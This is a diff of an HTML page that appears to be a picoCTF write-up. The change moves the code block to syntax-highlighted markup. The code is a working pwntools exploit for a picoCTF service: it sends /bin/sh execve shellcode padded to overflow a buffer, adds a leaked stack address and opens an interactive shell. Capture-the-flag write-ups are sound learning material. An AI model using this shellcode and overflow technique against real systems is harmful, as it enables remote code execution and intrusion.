@@ -47,45 +47,29 @@
 		<br><br>
 	</p>	
 </div>
-<div>
-    <style 
-    	type="text/css">
-    		pre code {
-					  background-color: #008080;
-					  border: 1px solid #999;
-					  display: block;
-					  padding: 15px;
-					  color:  #F5F5DC;
-					}
-    </style>
-    <pre>
-  		<code>
-#!/usr/bin/env python
-from pwn import *
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>
+<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
 
-p = remote('mercury.picoctf.net', 19968)
+<span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">remote(</span><span style="color: #2aa198">'mercury.picoctf.net'</span><span style="color: #839496">,</span> <span style="color: #2aa198">19968</span><span style="color: #839496">)</span>
 
-payload = b"\x31\xF6\x31\xD2\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x48\x89\xE7\x6A\x3B\x58\x0F\x05"
-payload = payload.ljust(120,b'A')
+<span style="color: #839496">payload</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b"\x31\xF6\x31\xD2\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x48\x89\xE7\x6A\x3B\x58\x0F\x05"</span>
+<span style="color: #839496">payload</span> <span style="color: #586e75">=</span> <span style="color: #839496">payload</span><span style="color: #586e75">.</span><span style="color: #839496">ljust(</span><span style="color: #2aa198">120</span><span style="color: #839496">,</span><span style="color: #2aa198">b'A'</span><span style="color: #839496">)</span>
 
-data = p.clean().decode('latin-1')
-leak = int(data,16)
-payload += p64(leak)
+<span style="color: #839496">data</span> <span style="color: #586e75">=</span> <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span><span style="color: #586e75">.</span><span style="color: #839496">decode(</span><span style="color: #2aa198">'latin-1'</span><span style="color: #839496">)</span>
+<span style="color: #839496">leak</span> <span style="color: #586e75">=</span> <span style="color: #268bd2">int</span><span style="color: #839496">(data,</span><span style="color: #2aa198">16</span><span style="color: #839496">)</span>
+<span style="color: #839496">payload</span> <span style="color: #586e75">+=</span> <span style="color: #839496">p64(leak)</span>
 
-p.sendline('a')
-p.clean()
-p.sendline(payload)
-p.interactive()
-  		</code>
-	</pre>
-</div>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'a'</span><span style="color: #839496">)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(payload)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
+</pre></div>
 <div>
 	<p>
 		<br>
 		After running the exploit, we spawn a shell and can read the flag.
 		<br><br>
 	</p>
-
 </div>
 <div>
 	<img src="../imgs/pico/chall2_3.png" alt="">
